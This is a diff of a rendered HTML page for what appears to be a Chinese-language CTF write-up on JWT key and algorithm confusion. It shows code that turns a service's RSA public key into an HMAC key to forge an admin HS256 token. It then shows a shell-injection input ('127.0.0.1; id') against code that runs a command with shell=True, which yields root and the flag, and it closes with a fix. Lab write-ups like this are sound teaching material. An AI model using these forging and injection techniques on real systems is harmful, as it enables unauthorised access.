+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">j</span><span class="p">[</span><span class="s2">"e"</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"=="</span><span class="p">),</span> <span class="s2">"big"</span><span class="p">)</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">pem</span> <span class="o">=</span> <span class="n">RSAPublicNumbers</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">public_key</span><span class="p">()</span><span class="o">.</span><span class="n">public_bytes</span><span class="p">(</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>    <span class="n">serialization</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">PEM</span><span class="p">,</span> <span class="n">serialization</span><span class="o">.</span><span class="n">PublicFormat</span><span class="o">.</span><span class="n">SubjectPublicKeyInfo</span><span class="p">)</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="nb">open</span><span class="p">(</span><span class="s2">"service_public.pem"</span><span class="p">,</span> <span class="s2">"wb"</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pem</span><span class="p">)</span>
 </span></code></pre></div>
 <div class="admonition warning">
 <p class="admonition-title">HMAC 的密钥必须是 PEM 的原始字节</p>
@@ -3847,20 +4118,20 @@
 <p>差一个换行，服务端算出来的就和你算出来的不是一个值，返回 401。</p>
 </div>
 <h4 id="_7"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_7">签完打过去</a></h4>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pem</span><span class="p">,</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>    <span class="c1"># 密钥就是 pem 这个 bytes</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">sig</span> <span class="o">=</span> <span class="n">b64</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pem</span><span class="p">,</span> <span class="n">seg</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>    <span class="c1"># 密钥就是 pem 这个 bytes</span>
 </span></code></pre></div>
 <p>header 用 <code>{"alg":"HS256","kid":"ops-console-2024"}</code>，payload 里的 <code>role</code> 必须还是 <code>admin</code>。</p>
 <p>返回 200，<code>report</code> 里是：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>/bin/sh: 1: ping: not found
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/bin/sh: 1: ping: not found
 </span></code></pre></div>
 <h3 id="flag"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#flag">拿 flag</a></h3>
 <p>那句 <code>ping: not found</code> 说明两件事：容器里没装 ping；<strong>这条命令是在 shell 里跑的</strong>，而 <code>target</code> 是直接拼进去的：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">command_line</span> <span class="o">=</span> <span class="s2">"</span><span class="si">%s</span><span class="s2"> -c 3 </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">command_line</span> <span class="o">=</span> <span class="s2">"</span><span class="si">%s</span><span class="s2"> -c 3 </span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command_line</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="o">...</span><span class="p">)</span>
 </span></code></pre></div>
 <p>所以 <code>target</code> 不是只能填 IP：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>target = 127.0.0.1; id
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>→ uid=0(root)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>target = 127.0.0.1; id
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>→ uid=0(root)
 </span></code></pre></div>
 <p>flag 在环境变量 <code>ZeroG_2026_FLAG</code> 和根目录 <code>/flag</code>（400 权限，但进程就是 root，照样能读）。</p>
 <div class="admonition note">
@@ -3891,7 +4162,7 @@
 </table>
 <p><strong>两个字段都是「调用方送来的元数据」，服务端却把它当成了自己的配置。</strong> 以后读代码时看到「从请求里取字段来决定验签路径」，就该警觉。</p>
 <p>正确写法就一句：算法白名单要按密钥来定，一把公钥只允许用于 RS256，不许跨算法家族复用。</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>     <span class="c1"># 算法由服务端决定，不是 token</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">pub</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">"RS256"</span><span class="p">])</span>     <span class="c1"># 算法由服务端决定，不是 token</span>
 </span></code></pre></div>
 <h3 id="_9"><a class="toclink" href="../../zerog-stage2-jwt-kid-alg/#_9">这题踩的坑</a></h3>
 <details class="note">
